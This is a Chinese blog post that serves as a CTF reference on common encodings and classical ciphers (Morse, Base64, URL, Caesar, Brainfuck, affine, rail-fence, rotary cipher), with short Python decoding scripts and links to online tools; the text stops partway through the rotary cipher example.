      <link href="/2020/07/13/CTF%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E6%95%B4%E7%90%86/"/>
      <url>/2020/07/13/CTF%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="01-常见编码"><a class="markdownIt-Anchor" href="#01-常见编码"></a> 01 常见编码</h1><h2 id="0x01-莫尔斯电码morse-code"><a class="markdownIt-Anchor" href="#0x01-莫尔斯电码morse-code"></a> 0x01 莫尔斯电码(Morse Code)</h2><h3 id="01-原理"><a class="markdownIt-Anchor" href="#01-原理"></a> 01 原理</h3><p>摩尔斯电码也被称作摩斯密码，是一种时通时断的<a href="https://baike.baidu.com/item/%E4%BF%A1%E5%8F%B7/32683" target="_blank" rel="noopener">信号</a>代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。</p><h3 id="02-特征"><a class="markdownIt-Anchor" href="#02-特征"></a> 02 特征</h3><ol><li>由<code>. -</code>组成的字符串；</li><li>由<code>0 1</code>组成的字符串，且为空格间隔得一组一组的。</li></ol><h3 id="03-解题"><a class="markdownIt-Anchor" href="#03-解题"></a> 03 解题</h3><ul><li><a href="http://ctf.ssleye.com/morse.html" target="_blank" rel="noopener">通道1(英文字母小写)</a></li><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">通道2(英文字母大写)</a></li><li><a href="http://moersima.00cha.net/" target="_blank" rel="noopener">通道3(英文字母小写)</a></li><li>01破解脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">'...'</span></span><br><span class="line">dic= &#123;    <span class="string">'01'</span>: <span class="string">'A'</span>,</span><br><span class="line">        <span class="string">'1000'</span>: <span class="string">'B'</span>,</span><br><span class="line">        <span class="string">'1010'</span>: <span class="string">'C'</span>,</span><br><span class="line">         <span class="string">'100'</span>: <span class="string">'D'</span>,</span><br><span class="line">           <span class="string">'0'</span>: <span class="string">'E'</span>,</span><br><span class="line">        <span class="string">'0010'</span>: <span class="string">'F'</span>,</span><br><span class="line">         <span class="string">'110'</span>: <span class="string">'G'</span>,</span><br><span class="line">        <span class="string">'0000'</span>: <span class="string">'H'</span>,</span><br><span class="line">          <span class="string">'00'</span>: <span class="string">'I'</span>,</span><br><span class="line">        <span class="string">'0111'</span>: <span class="string">'J'</span>,</span><br><span class="line">         <span class="string">'101'</span>: <span class="string">'K'</span>,</span><br><span class="line">        <span class="string">'0100'</span>: <span class="string">'L'</span>,</span><br><span class="line">          <span class="string">'11'</span>: <span class="string">'M'</span>,</span><br><span class="line">          <span class="string">'10'</span>: <span class="string">'N'</span>,</span><br><span class="line">        <span class="string">'111'</span>: <span class="string">'O'</span>,</span><br><span class="line">        <span class="string">'0110'</span>: <span class="string">'P'</span>,</span><br><span class="line">        <span class="string">'1101'</span>: <span class="string">'Q'</span>,</span><br><span class="line">        <span class="string">'010'</span>: <span class="string">'R'</span>,</span><br><span class="line">        <span class="string">'000'</span>: <span class="string">'S'</span>,</span><br><span class="line">        <span class="string">'1'</span>: <span class="string">'T'</span>,</span><br><span class="line">        <span class="string">'001'</span>: <span class="string">'U'</span>,</span><br><span class="line">        <span class="string">'0001'</span>: <span class="string">'V'</span>,</span><br><span class="line">        <span class="string">'011'</span>: <span class="string">'W'</span>,</span><br><span class="line">        <span class="string">'1001'</span>: <span class="string">'X'</span>,</span><br><span class="line">        <span class="string">'1011'</span>: <span class="string">'Y'</span>,</span><br><span class="line">        <span class="string">'1100'</span>: <span class="string">'Z'</span>,</span><br><span class="line">        <span class="string">'01111'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'00111'</span>: <span class="string">'2'</span>,</span><br><span class="line">        <span class="string">'00011'</span>: <span class="string">'3'</span>,</span><br><span class="line">        <span class="string">'00001'</span>: <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'00000'</span>: <span class="string">'5'</span>,</span><br><span class="line">        <span class="string">'10000'</span>: <span class="string">'6'</span>,</span><br><span class="line">        <span class="string">'11000'</span>: <span class="string">'7'</span>,</span><br><span class="line">        <span class="string">'11100'</span>: <span class="string">'8'</span>,</span><br><span class="line">        <span class="string">'11110'</span>: <span class="string">'9'</span>,</span><br><span class="line">        <span class="string">'11111'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'001100'</span>: <span class="string">'?'</span>,</span><br><span class="line">        <span class="string">'10010'</span>: <span class="string">'/'</span>,</span><br><span class="line">        <span class="string">'101101'</span>: <span class="string">'()'</span>,</span><br><span class="line">        <span class="string">'100001'</span>: <span class="string">'-'</span>,</span><br><span class="line">        <span class="string">'010101'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'110011'</span>:<span class="string">','</span>,</span><br><span class="line">        <span class="string">'011010'</span>:<span class="string">'@'</span>,</span><br><span class="line">        <span class="string">'111000'</span>:<span class="string">':'</span>,</span><br><span class="line">        <span class="string">'101010'</span>:<span class="string">':'</span>,</span><br><span class="line">        <span class="string">'10001'</span>:<span class="string">'='</span>,</span><br><span class="line">        <span class="string">'011110'</span>:<span class="string">"'"</span>,</span><br><span class="line">        <span class="string">'101011'</span>:<span class="string">'!'</span>,</span><br><span class="line">        <span class="string">'001101'</span>:<span class="string">'_'</span>,</span><br><span class="line">        <span class="string">'010010'</span>:<span class="string">'"'</span>,</span><br><span class="line">        <span class="string">'10110'</span>:<span class="string">'('</span>,</span><br><span class="line">        <span class="string">'1111011'</span>:<span class="string">'&#123;'</span>,</span><br><span class="line">        <span class="string">'1111101'</span>:<span class="string">'&#125;'</span></span><br><span class="line">        &#125;; </span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">    flag += dic[item]</span><br><span class="line">print( flag )</span><br><span class="line">print( flag.lower() )</span><br></pre></td></tr></table></figure><hr><h2 id="0x02-base643216编码"><a class="markdownIt-Anchor" href="#0x02-base643216编码"></a> 0x02 Base64/32/16编码</h2><h3 id="01-原理-2"><a class="markdownIt-Anchor" href="#01-原理-2"></a> 01 原理</h3><p>base64、base32、base16可以分别编码转化8位字节为6位、5位、4位，16、32、64分别表示用多少个字符来编码。以base64为例：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因。</p><h3 id="02-特征-2"><a class="markdownIt-Anchor" href="#02-特征-2"></a> 02 特征</h3><p>有大写、小写、数字，密文末尾一般为<code>==</code>。</p><h3 id="03-解题-2"><a class="markdownIt-Anchor" href="#03-解题-2"></a> 03 解题</h3><ul><li><a href="http://ctf.ssleye.com/base64.html" target="_blank" rel="noopener">通道1</a></li><li><a href="https://tool.bugku.com/safe/base64.php" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x03-escapeunescape编码"><a class="markdownIt-Anchor" href="#0x03-escapeunescape编码"></a> 0x03 Escape/Unescape编码</h2><h3 id="01-原理-3"><a class="markdownIt-Anchor" href="#01-原理-3"></a> 01 原理</h3><p>Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉&quot;%u&quot;后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p><h3 id="02-特征-3"><a class="markdownIt-Anchor" href="#02-特征-3"></a> 02 特征</h3><p>密文中含有<code>%u</code>。</p><h3 id="03-解题-3"><a class="markdownIt-Anchor" href="#03-解题-3"></a> 03 解题</h3><ul><li><a href="http://ctf.ssleye.com/escape.html" target="_blank" rel="noopener">通道1</a></li><li>工具Converter：Unescape</li></ul><hr><h2 id="0x04-html编码"><a class="markdownIt-Anchor" href="#0x04-html编码"></a> 0x04 HTML编码</h2><h3 id="01-原理-4"><a class="markdownIt-Anchor" href="#01-原理-4"></a> 01 原理</h3><p>完整编码手册：<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">我跳</a></p><h3 id="02-特征-4"><a class="markdownIt-Anchor" href="#02-特征-4"></a> 02 特征</h3><p>由元素<code>&amp;#x26;</code>构成，26可为别的数字。</p><h3 id="03-解题-4"><a class="markdownIt-Anchor" href="#03-解题-4"></a> 03 解题</h3><ul><li><a href="http://ctf.ssleye.com/html_en.html" target="_blank" rel="noopener">通道1</a></li><li><a href="https://tool.chinaz.com/tools/htmlencode.aspx" target="_blank" rel="noopener">通道2</a></li><li>工具Converter：Decode HTML</li></ul><hr><h2 id="0x05-unicode编码"><a class="markdownIt-Anchor" href="#0x05-unicode编码"></a> 0x05 Unicode编码</h2><h3 id="01-原理-5"><a class="markdownIt-Anchor" href="#01-原理-5"></a> 01 原理</h3><p>Unicode编码有以下四种编码方式：</p><ul><li>源文本： <code>The</code></li><li>&amp;#x [Hex]： <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></li><li>&amp;# [Decimal]： <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></li><li>\U [Hex]： <code>\U0054\U0068\U0065</code></li><li>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code></li></ul><h3 id="02-解题"><a class="markdownIt-Anchor" href="#02-解题"></a> 02 解题</h3><ul><li><a href="https://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">通道1</a></li><li><a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x06-url编码"><a class="markdownIt-Anchor" href="#0x06-url编码"></a> 0x06 URL编码</h2><h3 id="01-原理-6"><a class="markdownIt-Anchor" href="#01-原理-6"></a> 01 原理</h3><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><h3 id="02-解题-2"><a class="markdownIt-Anchor" href="#02-解题-2"></a> 02 解题</h3><ul><li><a href="https://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">通道1</a></li><li><a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="noopener">通道2</a></li></ul><hr><h1 id="02-代换密码"><a class="markdownIt-Anchor" href="#02-代换密码"></a> 02 代换密码</h1><h2 id="0x01-凯撒密码caesar-cipher"><a class="markdownIt-Anchor" href="#0x01-凯撒密码caesar-cipher"></a> 0x01 凯撒密码(Caesar Cipher)</h2><h3 id="01-原理-7"><a class="markdownIt-Anchor" href="#01-原理-7"></a> 01 原理</h3><p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。</p><ul><li><strong>加密</strong>：c=E_3(m)=m+3(\bmod 26)　0\leq m\leq 25</li><li><strong>解密</strong>：m=D_3(c)=c-3(\bmod 26)　0\leq c\leq 25</li></ul><p>凯撒有两种编码脚本，一种是字母26内循环移位，一种是127次非字母内的循环移位。</p><h3 id="02-样例"><a class="markdownIt-Anchor" href="#02-样例"></a> 02 样例</h3><ul><li>c =  xyz</li><li>m = abc</li></ul><h3 id="03-解题-5"><a class="markdownIt-Anchor" href="#03-解题-5"></a> 03 解题</h3><ul><li>CTFcrackTools工具(所有结果罗列)</li><li><a href="http://ctf.ssleye.com/caesar.html" target="_blank" rel="noopener">通道2(单个情况)</a></li><li>127次非字母内的循环移位脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">"""..."""</span> <span class="comment">#密文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">127</span>):</span><br><span class="line">    m = <span class="string">''</span> <span class="comment">#明文</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        temp = chr( (ord(i) + p) % <span class="number">127</span> )</span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt; ord(temp) &lt; <span class="number">127</span>:</span><br><span class="line">            m += temp</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'****%d****:'</span>%p, m)</span><br></pre></td></tr></table></figure><hr><h2 id="0x02-brainfuck加密"><a class="markdownIt-Anchor" href="#0x02-brainfuck加密"></a> 0x02 Brainfuck加密</h2><h3 id="01-原理-8"><a class="markdownIt-Anchor" href="#01-原理-8"></a> 01 原理</h3><p>Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf＊ck或brainf＊＊k，甚至被简称为BF。brainfuck语言用<code>&gt; &lt; + - . , [ ]</code>八种符号来替换C语言的各种语法和命令。</p><h3 id="02-解题-3"><a class="markdownIt-Anchor" href="#02-解题-3"></a> 02 解题</h3><ul><li><a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">通道1</a></li><li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x03-ook加密"><a class="markdownIt-Anchor" href="#0x03-ook加密"></a> 0x03 Ook加密</h2><h3 id="01-原理-9"><a class="markdownIt-Anchor" href="#01-原理-9"></a> 01 原理</h3><p>Ook密码中只含<code>Ook. Ook? Ook!</code>三个不同的语法元素。</p><h3 id="02-解题-4"><a class="markdownIt-Anchor" href="#02-解题-4"></a> 02 解题</h3><ul><li><a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">通道1</a></li><li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x04-加密"><a class="markdownIt-Anchor" href="#0x04-加密"></a> 0x04 .!?加密</h2><h3 id="01-原理-10"><a class="markdownIt-Anchor" href="#01-原理-10"></a> 01 原理</h3><p>.!?密码中只含<code>. ? !</code>三个不同的语法元素，使用Ook解密即可。</p><h3 id="02-解题-5"><a class="markdownIt-Anchor" href="#02-解题-5"></a> 02 解题</h3><ul><li><a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">通道1</a></li><li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x05-社会主义核心价值观"><a class="markdownIt-Anchor" href="#0x05-社会主义核心价值观"></a> 0x05 社会主义核心价值观</h2><h3 id="01-原理-11"><a class="markdownIt-Anchor" href="#01-原理-11"></a> 01 原理</h3><p>富强、民主、文明、和谐，自由、平等、公正、法治，爱国、敬业、诚信、友善。</p><h3 id="02-解题-6"><a class="markdownIt-Anchor" href="#02-解题-6"></a> 02 解题</h3><ul><li><a href="http://ctf.ssleye.com/cvencode.html" target="_blank" rel="noopener">通道1</a></li><li><a href="http://www.atoolbox.net/Tool.php?Id=850" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x06-标准银河字母"><a class="markdownIt-Anchor" href="#0x06-标准银河字母"></a> 0x06 标准银河字母</h2><h3 id="01-原理-12"><a class="markdownIt-Anchor" href="#01-原理-12"></a> 01 原理</h3><p>标准银河字母（Standard Galactic Alphabet）出自游戏《<a href="https://baike.baidu.com/item/%E6%8C%87%E6%8C%A5%E5%AE%98%E5%9F%BA%E6%81%A9/10345602" target="_blank" rel="noopener">指挥官基恩</a>》系列。是系列中使用的书写系统。字母对应如下：</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/eac4b74543a98226aab284e78a82b9014b90ebfb.png" width="1000" height="150" alt="图片名称" align="center" id="185"><hr><h2 id="0x07-仿射加密"><a class="markdownIt-Anchor" href="#0x07-仿射加密"></a> 0x07 仿射加密</h2><h3 id="01-原理-13"><a class="markdownIt-Anchor" href="#01-原理-13"></a> 01 原理</h3><p>仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。</p><ul><li><strong>加密</strong>：c = E_{a,b}(m) \equiv am+b(\bmod 26)</li><li><strong>解密</strong>：m = D_{a,b} \equiv a^{-1}(c-d)(\bmod 26)</li></ul><p>其中，a、b是密钥，为满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>≤</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>≤</mo><mn>2</mn><mn>5</mn></mrow><annotation encoding="application/x-tex">0\leq a,b\leq 25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.69444em;"></span><span class="strut bottom" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathrm">0</span><span class="mrel">≤</span><span class="mord mathit">a</span><span class="mpunct">,</span><span class="mord mathit">b</span><span class="mrel">≤</span><span class="mord mathrm">2</span><span class="mord mathrm">5</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo>(</mo><mi>a</mi><mo separator="true">,</mo><mn>2</mn><mn>6</mn><mo>)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(a,26) = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.03588em;">g</span><span class="mord mathit">c</span><span class="mord mathit">d</span><span class="mopen">(</span><span class="mord mathit">a</span><span class="mpunct">,</span><span class="mord mathrm">2</span><span class="mord mathrm">6</span><span class="mclose">)</span><span class="mrel">=</span><span class="mord mathrm">1</span></span></span></span>的整数。其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo>(</mo><mi>a</mi><mo separator="true">,</mo><mn>2</mn><mn>6</mn><mo>)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(a,26) = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.03588em;">g</span><span class="mord mathit">c</span><span class="mord mathit">d</span><span class="mopen">(</span><span class="mord mathit">a</span><span class="mpunct">,</span><span class="mord mathrm">2</span><span class="mord mathrm">6</span><span class="mclose">)</span><span class="mrel">=</span><span class="mord mathrm">1</span></span></span></span>表示a和26的最大公因子，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit">a</span><span class="vlist"><span style="top:0.15em;margin-right:0.05em;margin-left:0em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord scriptstyle cramped"><span class="mord">−</span><span class="mord mathrm">1</span></span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span></span></span></span>表示a的逆元，即a_{-1}*a \equiv 1(\mod26)。</p><h3 id="02-解题-7"><a class="markdownIt-Anchor" href="#02-解题-7"></a> 02 解题</h3><ul><li><strong>常规解法</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a = ... <span class="comment">#密钥</span></span><br><span class="line">b = ... <span class="comment">#密钥</span></span><br><span class="line">text = <span class="string">"..."</span> <span class="comment">#密文</span></span><br><span class="line">flag = <span class="string">""</span>    <span class="comment">#明文</span></span><br><span class="line"> </span><br><span class="line">text_list = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">    text_list.append( ord(i) - <span class="number">97</span> )</span><br><span class="line"></span><br><span class="line">aa = gmpy2.invert(a, <span class="number">26</span>) <span class="comment">#求解模逆元</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text_list:</span><br><span class="line">    tmp = (aa * (i - b)) % <span class="number">26</span></span><br><span class="line">    flag += chr(tmp + <span class="number">97</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><ul><li><strong>暴力破解</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">"..."</span></span><br><span class="line"> </span><br><span class="line">text_list = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">    text_list.append( ord(i) - <span class="number">97</span> )</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text_list:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        c = (<span class="number">17</span> * j - <span class="number">8</span>) % <span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span>(c == i):</span><br><span class="line">            flag += chr(j + <span class="number">97</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h2 id="0x08"><a class="markdownIt-Anchor" href="#0x08"></a> 0x08</h2><h3 id="01-原理-14"><a class="markdownIt-Anchor" href="#01-原理-14"></a> 01 原理</h3><p></p><h3 id="02-解题-8"><a class="markdownIt-Anchor" href="#02-解题-8"></a> 02 解题</h3><ul><li><a href>通道1</a></li><li><a href>通道2</a></li></ul><hr><h1 id="03-换位加密"><a class="markdownIt-Anchor" href="#03-换位加密"></a> 03 换位加密</h1><h2 id="0x01-栅栏密码rail-fence-cipher"><a class="markdownIt-Anchor" href="#0x01-栅栏密码rail-fence-cipher"></a> 0x01 栅栏密码(Rail-fence Cipher)</h2><h3 id="01-原理-15"><a class="markdownIt-Anchor" href="#01-原理-15"></a> 01 原理</h3><p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文。</p><h3 id="02-样例-2"><a class="markdownIt-Anchor" href="#02-样例-2"></a> 02 样例</h3><ul><li>c = KYsd3js2E{a2jda}<ul><li>KYsd3js2</li><li>E{a2jda}</li></ul></li><li>m = <code>KEY{sad23jjdsa2}</code></li></ul><h3 id="03-解题-6"><a class="markdownIt-Anchor" href="#03-解题-6"></a> 03 解题</h3><ul><li>CTFcrackTools工具(所有结果罗列)</li><li><a href="http://ctf.ssleye.com/railfence.html" target="_blank" rel="noopener">通道2(不区分大小写)</a></li><li><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">通道3(区分大小写)</a></li></ul><hr><h2 id="0x02-转盘加密"><a class="markdownIt-Anchor" href="#0x02-转盘加密"></a> 0x02 转盘加密</h2><h3 id="01-原理-16"><a class="markdownIt-Anchor" href="#01-原理-16"></a> 01 原理</h3><p><strong>题目</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;</span><br><span class="line">10：&lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;</span><br><span class="line">11：&lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;</span><br><span class="line">12：&lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt;</span><br><span class="line">13：&lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;</span><br><span class="line">14：&lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;</span><br><span class="line"></span><br><span class="line">密钥： 2,5,1,3,6,4,9,7,8,14,10,13,11,12</span><br><span class="line">密文：HCBTSXWCRQGLES</span><br><span class="line">flag格式 flag&#123;你解密的内容&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><p>这个转盘加密，比如第一个密钥匙：2、密文匙：H</p><p>把转盘第二行单独提出来  2： &lt;KPBELNACZDTRXMJQOY<strong>HGVSFUWI</strong> &lt; ；从H的地方一直剪切，把剪切的内容放在最前面，变成   2： &lt;<strong>HGVSFUWI</strong>KPBELNACZDTRXMJQOY &lt;</p><p>依次类推把14行都按这样的方式整一遍就得到这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2：  &lt;HGVSFUWIKPBELNACZDTRXMJQOY &lt;</span><br><span class="line">5：  &lt;CPMNZQWXYIHFRLABEUOTSGJVDK &lt;</span><br><span class="line">1：  &lt;BVIQHKYPNTCRMOSFEZWAXJGDLU &lt;</span><br><span class="line">3：  &lt;TEQGYXPLOCKBDMAIZVRNSJUWFH &lt;</span><br><span class="line">6：  